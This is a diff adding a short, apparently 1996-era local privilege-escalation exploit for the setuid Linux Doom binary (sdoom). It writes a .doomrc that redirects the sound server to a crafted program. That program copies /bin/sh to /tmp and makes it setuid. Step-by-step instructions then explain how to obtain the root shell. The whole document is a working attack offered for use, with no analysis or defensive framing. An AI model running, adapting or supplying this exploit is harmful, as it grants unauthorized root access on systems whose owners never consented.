@@ -1,0 +1,19 @@
+------------ CUT HERE --------------
+#!/bin/sh
+# Tue Dec 17 10:02:20 MET 1996 Bo
+echo 'sndserver "/tmp/sndserver"' > .doomrc
+cat > /tmp/sndserver.c << EOF
+#include <stdio.h>
+#include <unistd.h>
+main() {
+        if (fork()) while (getc(stdin));
+        else system("cp /bin/sh /tmp; chmod +s /tmp/sh");
+                /* or whatever you like to do */
+}
+EOF
+gcc /tmp/sndserver.c -o /tmp/sndserver
+------------ CUT HERE --------------
+The  fork()  is  just so that doom runs on nicely without locking up the
+keyboard  and  sndserver  gobbles  up all the sound data send to it. Run
+the script, start sdoom, quit the normal way, and execute /tmp/sh.
+
